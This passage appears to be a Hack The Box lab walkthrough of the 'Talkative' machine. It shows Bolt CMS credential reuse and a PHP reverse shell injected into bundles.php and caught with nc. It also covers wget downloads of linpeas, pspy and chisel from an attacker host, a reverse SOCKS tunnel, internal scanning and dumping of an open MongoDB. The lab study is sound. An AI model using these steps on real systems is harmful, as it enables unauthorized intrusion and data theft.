    "labels": [
      [
        0,
        "Password",
        "Password",
        false
      ],
      [
        1,
        "jeO09ufhWD<s",
        "jeO09ufhWD<s",
        false
      ],
      [
        2,
        "bZ89h}V<S_DA",
        "bZ89h}V<S_DA",
        false
      ],
      [
        3,
        ")SQWGm>9KHEA",
        ")SQWGm>9KHEA",
        false
      ]
    ]
  },
  "C": {
    "labels": []
  }
}

```
Credentials
| Email  |  Password |
|---|---|
| matt@talkative.htb  |  jeO09ufhWD<s |
|  janit@talkative.htb | bZ89h}V<S_DA  |
|  saul@talkative.htb | )SQWGm>9KHEA  |

The credentials did not work on the rocket.chat application. I've also checked for ```password reuse``` on the ```default admin account```. No luck.
### Password Reuse on Bolt
The output of wappalalizer indicated that Bold CMS was running on Port 80.

From  https://docs.boltcms.io/4.0/configuration/introduction
> Tip: By default, the Bolt backend is located at /bolt, relative from the 'home' location of your website.

Admin Panel: http://talkative.htb/bolt

 So i've checked the credentials on the bold admin panel. But no luck. 
 I've checked the default credentials -  no luck.
 From: https://bestofphp.com/repo/bolt-core-php-cms
>  You can log on, using the default user & pass:
> 
>     user: admin
>     pass: admin%1

 Then i've checked for ```password reuse``` on ```bolt``` and was able to login with the```default user``` ```admin``` and the credentials of ```Matt```.

| Username  |  Password |
|---|---|
| admin |  jeO09ufhWD<s |

*The weird thing was that i've logged in with the ```password``` of ```Matt``` but was greeted with ```Hey, Saul!```*

```Bolt version 5.1.3``` has no public vulnerability that would be easy to go for.

I tried to upload a php reverse shell, like I would normally do with ```WordPress```, but php file uploads were forbidden. So i've checked for existing ```.php``` files and tried to inject my webshell in there.

I copied https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php into the ```bundles.php``` file under ```Configuration>All Configurations>Bundles.php``` and configured ```$ip``` and ```$port```.
After reloading the page I immeditaly recieved a shell but that broke the application. 

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242             
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242


Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:44970.
Linux afc2481daa81 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 GNU/Linux
 11:41:19 up 13 min,  0 users,  load average: 0.00, 0.05, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ $ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

```
## 2nd Docker Container Enumeration
```/etc/passwd``` indicated that no other user was interesting enough to pivot to, so we probably have to deal with a ```docker escape```.

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
### Stabilize the shell
The reverse shell was kinda unstable and since I was still in enumeration phase  I've decided to test out ```pwncat```
https://github.com/calebstewart/pwncat


```
┌──(kali㉿kali)-[~/htb/talkative]
└─$ /home/kali/.local/bin/pwncat-cs -lp 4242   
[15:59:34] Welcome to pwncat 🐈!                                                                                                             __main__.py:164
[15:59:38] received connection from 10.10.11.155:45180                                                                                            bind.py:84
[15:59:38] 0.0.0.0:4242: upgrading from /bin/dash to /bin/bash                                                                                manager.py:957
[15:59:39] 10.10.11.155:45180: registered new host w/ db                                                                                      manager.py:957
(local) pwncat$ help
                                                                            
  Command     Description                                                   
 ────────────────────────────────────────────────────────────────────────── 
  alias       Alias an existing command with a new name. Specifying [...]   
  back        Return to the remote terminal                                 
  bind        Create key aliases for when in raw mode. This only [...]      
  connect     Connect to a remote victim. This command is only valid [...]  
  download    Download a file from the remote host to the local host        
  escalate    Attempt privilege escalation in the current session. [...]    
  exit        Exit the interactive prompt. If sessions are active, [...]    
  help        List known commands and print their associated help [...]     
  info        View info about a module                                      
  lcd         Change the local current working directory                    
  leave       Leave a layer of execution from this session. Layers [...]    
  listen      Create a new background listener. Background listeners [...]  
  listeners   Manage active or stopped background listeners. This [...]     
  load        Load modules from the specified directory. This does [...]    
  local       Run a local shell command on your attacking machine           
  lpwd        Print the local current working directory                     
  reset       Reset the remote terminal to the standard pwncat [...]        
  run         Run a module. If no module is specified, use the [...]        
  search      View info about a module                                      
  sessions    Interact and control active remote sessions. This [...]       
  set         Set variable runtime variable parameters for pwncat           
  shortcut                                                                  
  upload      Upload a file from the local host to the remote host          
  use         Set the currently used module in the config handler           
                                                                            
(local) pwncat$
Active Session: 10.10.11.155:45180  
```

The docker container was hardened, had very view tools installed and no cronjobs, running processes(that looked interesting) or other indicators that we can look into further.

I've run a couple of enumeration modules of ```pwncat``` and ```linpeas``` but had no luck in finding something relevant.
### SSH unfiltered access
Eventually I've tried to SSH from the ```container``` to the IP of the box, because in the inital Enumeration Phase i've found the SSH service to be filtered or restricted.
And the output actually indicated that the SSH service of the machine is accessible from within the docker container.
```
(remote) www-data@afc2481daa81:/dev$ ssh yeeb@10.10.11.155 -v  
OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.10.11.155 [10.10.11.155] port 22.
debug1: Connection established.
debug1: identity file /var/www/.ssh/id_rsa type -1
debug1: identity file /var/www/.ssh/id_rsa-cert type -1
debug1: identity file /var/www/.ssh/id_dsa type -1
debug1: identity file /var/www/.ssh/id_dsa-cert type -1
debug1: identity file /var/www/.ssh/id_ecdsa type -1
debug1: identity file /var/www/.ssh/id_ecdsa-cert type -1
debug1: identity file /var/www/.ssh/id_ecdsa_sk type -1
debug1: identity file /var/www/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /var/www/.ssh/id_ed25519 type -1
debug1: identity file /var/www/.ssh/id_ed25519-cert type -1
debug1: identity file /var/www/.ssh/id_ed25519_sk type -1
debug1: identity file /var/www/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /var/www/.ssh/id_xmss type -1
debug1: identity file /var/www/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.4p1 Debian-5
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
debug1: match: OpenSSH_8.2p1 Ubuntu-4ubuntu0.4 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 10.10.11.155:22 as 'yeeb'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY
The authenticity of host '10.10.11.155 (10.10.11.155)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
```

So I've checked for Password Reuse and found the following combination valid:

| Username  |  Password |
|---|---|
| saul |  jeO09ufhWD<s |

This combination was indicated by the ```Greeting Message of Bolt``` -  I assume the box creator mixed up the  credentials.

```
(remote) www-data@afc2481daa81:/dev$ ssh saul@10.10.11.155
The authenticity of host '10.10.11.155 (10.10.11.155)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
saul@10.10.11.155's password: 
Permission denied, please try again.
saul@10.10.11.155's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 24 Jun 2022 01:02:21 PM UTC

  System load:                      0.06
  Usage of /:                       72.9% of 8.80GB
  Memory usage:                     68%
  Swap usage:                       0%
  Processes:                        380
  Users logged in:                  0
  IPv4 address for br-ea74c394a147: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.155
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:c228


18 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

saul@talkative:~$ 
```


## Privilege Escalation

So we are finally on the host and now we can start to enumerate the internals of the machine.

### Linpeas   
I've started off with ```linpeas.sh```

Server:
```
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ mv ../linpeas.sh .                                
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ python3 -m updog -p 80
[+] Serving /home/kali/htb/talkative/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.155 - - [24/Jun/2022 17:06:50] "GET / HTTP/1.1" 200 -
10.10.11.155 - - [24/Jun/2022 17:06:57] "GET /linpeas.sh HTTP/1.1" 200 -
```

Client:
```
saul@talkative:/dev/shm$ wget 10.10.14.4/linpeas.sh
--2022-06-24 13:12:57--  http://10.10.14.4/linpeas.sh
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776785 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                             100%[============================================================================>] 758.58K  2.96MB/s    in 0.3s    

2022-06-24 13:12:57 (2.96 MB/s) - ‘linpeas.sh’ saved [776785/776785]
```


```/etc/passwd``` indicated that there are not other users that are interesting to go for so there must be a direct way to escalate to root.


```
╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash 
saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash
```

There was no output from linpeas that would be interesting to dive in, so I've continued enumeration with pspy.
https://github.com/DominicBreuker/pspy
### PSPY Process Snooping
Host files on server:
```
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64       
--2022-06-24 17:43:15--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220624%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220624T134046Z&X-Amz-Expires=300&X-Amz-Signature=12a9d58673faf49faa51ccfa1bf86a5268b13837200f60e16fbe1e6c6d46c3ca&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2022-06-24 17:43:15--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220624%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220624T134046Z&X-Amz-Expires=300&X-Amz-Signature=12a9d58673faf49faa51ccfa1bf86a5268b13837200f60e16fbe1e6c6d46c3ca&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                 100%[============================================================================>]   2.94M  13.5MB/s    in 0.2s    

2022-06-24 17:43:16 (13.5 MB/s) - ‘pspy64’ saved [3078592/3078592]

                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ python3 -m updog -p 80
[+] Serving /home/kali/htb/talkative/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.155 - - [24/Jun/2022 17:43:32] "GET /pspy64 HTTP/1.1" 200 -
```

Download the files to the client:
```
saul@talkative:/dev/shm$ wget 10.10.14.4/pspy64
--2022-06-24 13:41:02--  http://10.10.14.4/pspy64
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [text/plain]
Saving to: ‘pspy64’

pspy64                                 100%[============================================================================>]   2.94M  3.28MB/s    in 0.9s    

2022-06-24 13:41:03 (3.28 MB/s) - ‘pspy64’ saved [3078592/3078592]

saul@talkative:/dev/shm$ chmod +x pspy64 
saul@talkative:/dev/shm$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
```

Eventually i've noticed some python processes that get almost exactly every minute:

```
2022/06/24 13:51:01 CMD: UID=0    PID=48156  | 
2022/06/24 13:51:01 CMD: UID=0    PID=48154  | /bin/sh -c python3 /root/.backup/update_mongo.py 
2022/06/24 13:51:01 CMD: UID=0    PID=48159  | python3 /root/.backup/update_mongo.py 
2022/06/24 13:52:01 CMD: UID=0    PID=48167  | cp /root/.backup/passwd /etc/passwd 
2022/06/24 13:52:01 CMD: UID=0    PID=48166  | /bin/sh -c cp /root/.backup/passwd /etc/passwd 
2022/06/24 13:52:01 CMD: UID=0    PID=48165  | /usr/sbin/CRON -f 
2022/06/24 13:52:01 CMD: UID=0    PID=48164  | /usr/sbin/CRON -f 
2022/06/24 13:52:01 CMD: UID=0    PID=48168  | /bin/sh -c cp /root/.backup/shadow /etc/shadow 
2022/06/24 13:53:01 CMD: UID=0    PID=48173  | 
2022/06/24 13:53:01 CMD: UID=0    PID=48171  | /usr/sbin/CRON -f 
2022/06/24 13:54:01 CMD: UID=0    PID=48181  | /usr/sbin/CRON -f 
2022/06/24 13:54:01 CMD: UID=0    PID=48180  | python3 /root/.backup/update_mongo.py 
2022/06/24 13:54:01 CMD: UID=0    PID=48179  | /bin/sh -c python3 /root/.backup/update_mongo.py 
2022/06/24 13:54:01 CMD: UID=0    PID=48178  | /usr/sbin/CRON -f 
2022/06/24 13:54:01 CMD: UID=0    PID=48177  | /usr/sbin/CRON -f 
2022/06/24 13:54:01 CMD: UID=0    PID=48176  | /usr/sbin/CRON -f 
2022/06/24 13:54:01 CMD: UID=0    PID=48183  | /bin/sh -c cp /root/.backup/passwd /etc/passwd 
2022/06/24 13:54:01 CMD: UID=0    PID=48182  | /bin/sh -c cp /root/.backup/passwd /etc/passwd 
2022/06/24 13:54:01 CMD: UID=0    PID=48184  | /bin/sh -c cp /root/.backup/shadow /etc/shadow 
```
Those are clearly some cleanup tasks from the box creator and definitely worth looking into.

So the take aways are:
* We've got a python script called update_mongo.py
* We've got a backup process that resets /etc/passwd and /etc/shadow
* We still got the rocket.chat application, that we have not touched yet.



### Accessing the MongoDB

I was not able to enumerate the port or docker container that ```mongodb``` is running on, so i used ```chisel``` to gain internal access on the machine so we can run nmap scans internally.

I used this blog post back from my OSCP preparation as guide:
https://ap3x.github.io/posts/pivoting-with-chisel/

Host files on a server:
```
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ chmod +x chisel    
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/talkative/serve]
└─$ ./chisel server -p 8083 --reverse
2022/06/24 18:20:33 server: Reverse tunnelling enabled
2022/06/24 18:20:33 server: Fingerprint IFoG26T+jCtJLquFoZd4sHC5YY0Ym0PIi0yrprTXAao=
2022/06/24 18:20:33 server: Listening on http://0.0.0.0:8083
2022/06/24 18:20:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

Download to a client:
```
saul@talkative:~$ wget 10.10.14.4/chisel
--2022-06-24 14:17:38--  http://10.10.14.4/chisel
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [text/plain]
Saving to: ‘chisel’

chisel                                 100%[============================================================================>]   7.70M  3.41MB/s    in 2.3s    

2022-06-24 14:17:40 (3.41 MB/s) - ‘chisel’ saved [8077312/8077312]

saul@talkative:~$ chmod +x ./chisel 
saul@talkative:~$ ./chisel client 10.10.14.4:8083 R:1080:socks
2022/06/24 14:18:27 client: Connecting to ws://10.10.14.4:8083
2022/06/24 14:18:27 client: Connected (Latency 24.293423ms)
```

We can confirm the tunnel working by running a simple ```nmap``` scans via ```proxychains4```:

```
┌──(kali㉿kali)-[~]
└─$ proxychains4 -q nmap 127.0.0.1                                                                                                                    130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 18:24 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.076s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 76.96 seconds
```

The port ```27017``` of the ```mongod``` is closed on the host.
```
┌──(kali㉿kali)-[~]
└─$ proxychains4 -q nmap 127.0.0.1 -p 27017
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 18:40 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.076s latency).

PORT      STATE  SERVICE
27017/tcp closed mongod

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds                                                     
```

From https://support.hyperglance.com/knowledge/changing-the-default-docker-subnet


> By default, Docker uses 172.17.0.0/16. This can conflict with your cloud subnet IP range. Here's how to update it.

Pingscan and searching for the docker container that hosts the mongodb.

```
┌──(kali㉿kali)-[~]
└─$ proxychains4 -q nmap 172.17.0.0/24 -p 27017  -vvv                                                                                                 130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 18:57 CEST
Initiating Ping Scan at 18:57
Scanning 256 hosts [2 ports/host]
Ping Scan Timing: About 6.35% done; ETC: 19:06 (0:07:52 remaining)
Ping Scan Timing: About 10.25% done; ETC: 19:07 (0:09:11 remaining)
Ping Scan Timing: About 29.79% done; ETC: 19:10 (0:08:39 remaining)
Ping Scan Timing: About 35.64% done; ETC: 19:09 (0:07:35 remaining)
Ping Scan Timing: About 41.89% done; ETC: 19:09 (0:06:59 remaining)
Ping Scan Timing: About 47.75% done; ETC: 19:09 (0:06:22 remaining)
Ping Scan Timing: About 53.22% done; ETC: 19:09 (0:05:45 remaining)
Ping Scan Timing: About 58.30% done; ETC: 19:09 (0:05:04 remaining)
Ping Scan Timing: About 63.77% done; ETC: 19:09 (0:04:26 remaining)
Ping Scan Timing: About 69.24% done; ETC: 19:10 (0:03:47 remaining)
Ping Scan Timing: About 74.32% done; ETC: 19:09 (0:03:09 remaining)
Ping Scan Timing: About 79.79% done; ETC: 19:10 (0:02:30 remaining)
Ping Scan Timing: About 84.86% done; ETC: 19:10 (0:01:52 remaining)
Ping Scan Timing: About 89.94% done; ETC: 19:10 (0:01:15 remaining)
Ping Scan Timing: About 95.02% done; ETC: 19:10 (0:00:37 remaining)
Completed Ping Scan at 19:10, 742.29s elapsed (256 total hosts)
Initiating Parallel DNS resolution of 256 hosts. at 19:10
Completed Parallel DNS resolution of 256 hosts. at 19:10, 2.51s elapsed
DNS resolution of 256 IPs took 2.52s. Mode: Async [#: 2, OK: 0, NX: 256, DR: 0, SF: 0, TR: 317, CN: 0]
Initiating Connect Scan at 19:10
Scanning 256 hosts [1 port/host]
Connect Scan Timing: About 6.64% done; ETC: 19:17 (0:07:16 remaining)
Connect Scan Timing: About 10.55% done; ETC: 19:20 (0:08:54 remaining)
Connect Scan Timing: About 31.25% done; ETC: 19:22 (0:08:24 remaining)
Connect Scan Timing: About 37.11% done; ETC: 19:21 (0:07:22 remaining)
Connect Scan Timing: About 43.36% done; ETC: 19:22 (0:06:46 remaining)
Connect Scan Timing: About 49.61% done; ETC: 19:22 (0:06:08 remaining)
Connect Scan Timing: About 55.08% done; ETC: 19:22 (0:05:31 remaining)
Discovered open port 27017/tcp on 172.17.0.2
Connect Scan Timing: About 60.16% done; ETC: 19:22 (0:04:49 remaining)
Connect Scan Timing: About 65.62% done; ETC: 19:22 (0:04:12 remaining)
Connect Scan Timing: About 71.48% done; ETC: 19:22 (0:03:28 remaining)
Connect Scan Timing: About 76.95% done; ETC: 19:22 (0:02:50 remaining)
Connect Scan Timing: About 82.03% done; ETC: 19:22 (0:02:12 remaining)
Connect Scan Timing: About 87.50% done; ETC: 19:22 (0:01:32 remaining)
Connect Scan Timing: About 92.58% done; ETC: 19:22 (0:00:55 remaining)
Completed Connect Scan at 19:22, 742.72s elapsed (256 total ports)
Nmap scan report for 172.17.0.0
Host is up, received conn-refused (0.078s latency).
Scanned at 2022-06-24 19:14:11 CEST for 0s

PORT      STATE  SERVICE REASON
27017/tcp closed mongod  conn-refused

Nmap scan report for 172.17.0.1
Host is up, received conn-refused (0.076s latency).
Scanned at 2022-06-24 19:10:06 CEST for 0s

PORT      STATE  SERVICE REASON
27017/tcp closed mongod  conn-refused

Nmap scan report for 172.17.0.2
Host is up, received conn-refused (0.076s latency).
Scanned at 2022-06-24 19:16:55 CEST for 0s

PORT      STATE SERVICE REASON
27017/tcp open  mongod  syn-ack
[TRUNCATED]
```
Yay! ```mongod``` is running on ```172.17.0.2```


Let's start interacting with the port with the support of https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb

```
┌──(kali㉿kali)-[~]
└─$ proxychains4 -q mongo 172.17.0.2                                                                                                                  127 ⨯
MongoDB shell version v5.3.1
connecting to: mongodb://172.17.0.2:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("4741523d-074d-425e-bce3-e8f6f49f9abb") }
MongoDB server version: 4.0.26
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
        https://community.mongodb.com
---
The server generated these startup warnings when booting: 
2022-06-24T11:28:25.712+0000 I STORAGE  [initandlisten] 
2022-06-24T11:28:25.712+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-06-24T11:28:25.712+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-06-24T11:28:28.141+0000 I CONTROL  [initandlisten] 
2022-06-24T11:28:28.141+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-06-24T11:28:28.142+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-06-24T11:28:28.142+0000 I CONTROL  [initandlisten] 
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
rs0:PRIMARY> 
```

Interaction with the database over ```proxychains``` works flawlessly.

There are four databases that might be interesting to look at ```admin```, ```config```, ```local``` and ```meteor```.

```
rs0:PRIMARY> show databases
admin   0.000GB
config  0.000GB
local   0.011GB
meteor  0.005GB
rs0:PRIMARY> use admin
switched to db admin
rs0:PRIMARY> show tables
system.keys
system.version
rs0:PRIMARY> db.system.keys.find()
{ "_id" : NumberLong("6994889321446637571"), "purpose" : "HMAC", "key" : BinData(0,"be8+vxMbbQGXhSIC9JCM8PJ5AW4="), "expiresAt" : Timestamp(1636400583, 0) }
{ "_id" : NumberLong("6994889321446637572"), "purpose" : "HMAC", "key" : BinData(0,"UgV2A8wC1s8DKqLR3Fkq0/iImwY="), "expiresAt" : Timestamp(1644176583, 0) }
{ "_id" : NumberLong("7064639126477209602"), "purpose" : "HMAC", "key" : BinData(0,"jYn6UX96rygTtoGqDmO8rioyOMw="), "expiresAt" : Timestamp(1652640475, 0) }
{ "_id" : NumberLong("7064639126477209603"), "purpose" : "HMAC", "key" : BinData(0,"7eIYSysppesFzKU625JGtz3DyQ8="), "expiresAt" : Timestamp(1660416475, 0) }
{ "_id" : NumberLong("7112766958038155266"), "purpose" : "HMAC", "key" : BinData(0,"vfYi2PaRIhmWT2CQSAUXr475yEk="), "expiresAt" : Timestamp(1668192475, 0) }
rs0:PRIMARY> 
```
After some research it seems like the ```admin``` database is a ```default database``` of mongodb. it seems to store some  ```HMAC keys```, which are not interesting yet.
https://github.com/mongodb/mongo/blob/6078864280613cf9abf901855f09ba03d18a5953/src/mongo/db/s/README.md#key-management

Lets check on the ```meteor``` database next, since the name seems pretty interesting.
```
rs0:PRIMARY> use meteor
switched to db meteor
rs0:PRIMARY> show tables
_raix_push_app_tokens
_raix_push_notifications
instances
meteor_accounts_loginServiceConfiguration
meteor_oauth_pendingCredentials
meteor_oauth_pendingRequestTokens
migrations
rocketchat__trash
rocketchat_apps
rocketchat_apps_logs
rocketchat_apps_persistence
rocketchat_avatars
rocketchat_avatars.chunks
rocketchat_avatars.files
rocketchat_credential_tokens
rocketchat_cron_history
rocketchat_custom_emoji
rocketchat_custom_sounds
rocketchat_custom_user_status
rocketchat_export_operations
rocketchat_federation_dns_cache
rocketchat_federation_keys
rocketchat_federation_room_events
rocketchat_federation_servers
rocketchat_import
rocketchat_integration_history
rocketchat_integrations
rocketchat_invites
rocketchat_livechat_agent_activity
rocketchat_livechat_custom_field
rocketchat_livechat_department
rocketchat_livechat_department_agents
rocketchat_livechat_external_message
rocketchat_livechat_inquiry
rocketchat_livechat_office_hour
rocketchat_livechat_page_visited
rocketchat_livechat_trigger
rocketchat_livechat_visitor
rocketchat_message
rocketchat_message_read_receipt
rocketchat_oauth_apps
rocketchat_oembed_cache
rocketchat_permissions
rocketchat_reports
rocketchat_roles
rocketchat_room
rocketchat_sessions
rocketchat_settings
rocketchat_smarsh_history
rocketchat_statistics
rocketchat_subscription
rocketchat_uploads
rocketchat_user_data_files
rocketchat_webdav_accounts
system.views
ufsTokens
users
usersSessions
view_livechat_queue_status
```
### Gaining Access
Ah! It's the database of ```rocketchat```! Let's see if we can grab some credentials.

```
rs0:PRIMARY> db.users.find()
{ "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
